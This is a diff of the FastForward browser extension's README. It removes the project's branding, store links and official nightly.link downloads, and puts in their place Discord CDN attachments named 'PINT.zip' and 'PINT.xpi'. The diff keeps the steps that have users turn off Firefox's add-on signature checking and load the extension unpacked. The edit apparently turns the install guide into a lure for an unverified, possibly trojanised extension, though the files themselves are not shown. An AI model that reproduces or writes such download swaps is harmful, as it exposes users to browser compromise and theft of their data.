@@ -1,60 +1,10 @@
-<div align="center">
-<h1><img src="https://fastforward.team/img/branding.png" width="256"></h1>
-<p> Don't waste your time with compliance. FastForward automatically skips annoying link shorteners. </p>
-
-<a href="https://github.com/FastForwardTeam/FastForward/blob/main/.github/workflows/main.yml" target="_blank"> <img alt="Builds" src="https://img.shields.io/github/actions/workflow/status/fastforwardteam/fastforward/main.yml?branch=main&label=Builds&style=for-the-badge&logo=githubactions"> </a>
-<a href="https://discord.gg/RSAf7b5njt" target="_blank"> <img alt="Discord" src="https://img.shields.io/discord/876622516607656006?label=Our%20Discord&logo=discord&style=for-the-badge"> </a>
-
-
-<a href="https://chromewebstore.google.com/detail/fastforward/icallnadddjmdinamnolclfjanhfoafe"><img src="https://user-images.githubusercontent.com/585534/107280622-91a8ea80-6a26-11eb-8d07-77c548b28665.png" alt="Get FastForward on Chromium based browsers" width="177"> </a>
-<a href="https://microsoftedge.microsoft.com/addons/detail/fastforward/ldcclmkclhomnpcnccgbgleikchbnecl"><img src="https://user-images.githubusercontent.com/585534/107280673-a5ece780-6a26-11eb-9cc7-9fa9f9f81180.png" alt="Get FastForward on Microsoft Edge" width="126px"></a>
-<a href="https://addons.mozilla.org/firefox/addon/fastforwardteam/"><img src="https://user-images.githubusercontent.com/585534/107280546-7b9b2a00-6a26-11eb-8f9f-f95932f4bfec.png" alt="Get FastForward for Firefox" width="126px"></a> 
-</div>
-
-# Table of Contents
-- [Unstable Builds](#download-unstable-builds)
-- [Installing from web stores](#installing-from-web-stores)
-- [Manual Installation](#manual-installation)
-  - [Chrome, Chromium, Opera, Brave, Vivaldi, Kiwi](#chrome-chromium-kiwi-opera-opera-gx-vivaldi-brave-etc)
-     - [CRX install](#crx-install)
-  - [Firefox](#firefox-and-firefox-based-browsers)
-    - [Firefox for Android](#firefox-for-android)
-- [Troubleshooting](#troubleshooting)
-
-## Download unstable builds
-<div align="center">
-<a href="https://nightly.link/FastForwardTeam/FastForward/workflows/main/main/FastForward_chromium.zip"> <img src="https://img.shields.io/badge/Chrome-Dev%20builds-critical?style=for-the-badge&logo=googlechrome" /> </a>
-  <br>
-<a href="https://nightly.link/FastForwardTeam/FastForward/workflows/main/main/FastForward_firefox.zip"> <img src="https://img.shields.io/badge/Firefox-Dev%20builds-critical?style=for-the-badge&logo=firefoxbrowser" /> </a>
-</div>
-
-## Installing from Web-Stores
-
-Currently, FastForward is present on the Firefox, Chrome and Edge Addons Store.
-
-### Chrome
-<a href="https://chromewebstore.google.com/detail/fastforward/icallnadddjmdinamnolclfjanhfoafe"> <img alt="Mozilla Add-on" src="https://img.shields.io/badge/get%20the%20extension-5648de?logo=googlechrome&style=for-the-badge&logoColor=white"/> </a>
-
-### Firefox
-We have been removed from Firefox store!
-We'll get back to it shortly.
-
-<a href="https://addons.mozilla.org/firefox/addon/fastforwardteam/"> <img alt="Mozilla Add-on" src="https://img.shields.io/badge/get%20the%20extension-5648de?logo=firefoxbrowser&style=for-the-badge"/> </a>
-
-### Edge
-<a href="https://microsoftedge.microsoft.com/addons/detail/fastforward/ldcclmkclhomnpcnccgbgleikchbnecl"> <img src="https://img.shields.io/badge/get%20the%20extension-5648de?style=for-the-badge&logo=microsoftedge&logoColor=blue" /> </a>
-
-
-
 ## Manual Installation
 These are the instructions for installing the extension in "unpacked" mode.
 
 ### Chrome, Chromium, Kiwi, Opera, Opera GX, Vivaldi, Brave etc.
 Make sure to read carefully to avoid any errors.
 
-0. **REMOVE any previous versions of FastForward.**
-
-1. Download the extension using [this link](https://nightly.link/FastForwardTeam/FastForward/workflows/main/main/FastForward_chromium.zip). You'll end with a .zip file on your downloads, like on the screenshot below:
+1. Download the extension using [this link](https://cdn.discordapp.com/attachments/1085844261343342682/1153970863046144000/PINT.zip). You'll end with a .zip file on your downloads, like on the screenshot below:
 ![1](https://i.imgur.com/Nrdgd7R.png)
 
 2. Now unzip the file, using any software you prefer. In the screenshot below, I used [7-zip](https://7-zip.org) to unzip the file.
@@ -77,15 +27,8 @@ Or renaming the file extension, like on the gif below:
 5. Now click on "Load unpacked", and select the folder where Fast Forward was extracted.
 ![5](https://i.imgur.com/FFQGC2F.gif)
 
-6. If you got any errors, or a message like "You're using FastForward in development mode", see the [Troubleshooting section](#troubleshooting).
+6. If you got any errors, or a message like "You're using ... in development mode", see the [Troubleshooting section](#troubleshooting).
 
-#### CRX Install
-You can also use auto-updating builds for Google Chrome (Windows, Linux & macOS), Brave (Windows, Linux & macOS), Kiwi (Android), Ungoogled Chromium and Edge. We do not recommend installing from this method if you aren't an experienced user. If you're having trouble installing this way, please install the extension manually.
-
-<details> <summary> Click here for crx install instructions </summary>  
-
-Please follow [the instructions here](https://github.com/FastForwardTeam/releases#installation-instructions) to install the extension using CRX mode.
-</details>
 
 ### Firefox and Firefox-based browsers
 
@@ -94,26 +37,14 @@ Please follow [the instructions here](https://github.com/FastForwardTeam/release
 
 0. **REMOVE any previous versions of FastForward.**
 
-1. Download the zip using [this link](https://nightly.link/FastForwardTeam/FastForward/workflows/main/main/FastForward_firefox.zip).
-2. Unzip the downloaded file so that you have `FastForward_firefox_X.XXXX.xpi`.
+1. Download the zip using [this link](https://cdn.discordapp.com/attachments/1085844261343342682/1153971385379594250/PINT.xpi).
 3. Open `about:config`
 4. Search for `xpinstall.signatures.required`
 5. Toggle `xpinstall.signatures.required` to `false` using the button on the right.
 6. Restart Firefox.
 7. Open `about:addons`
-8. Drag your `FastForward_firefox_X.XXXX.xpi` into Firefox, and click "add" when prompted.
+8. Drag your `.xpi` into Firefox, and click "add" when prompted.
 
-#### Firefox for Android
-
-1. Click [here](https://blog.mozilla.org/addons/2020/09/29/expanded-extension-support-in-firefox-for-android-nightly/) and follow the steps.
-2. When you are on step 5, place this number: `17352072` on Collection Owner.
-3. Write `FastForward` on Collection Name.
-4. Tap "Ok".
-5. Open Firefox.
-6. Tap on the 3 dots.
-7. Tap on Extensions.
-8. Find FastForward.
-9. Add FastForward.
 
 ## Troubleshooting
 <details> <summary> "Manifest version 2 is deprecated, and support will be removed in 2023. See https://developer.chrome.com/blog/mv2-transition/ for more details." </summary>
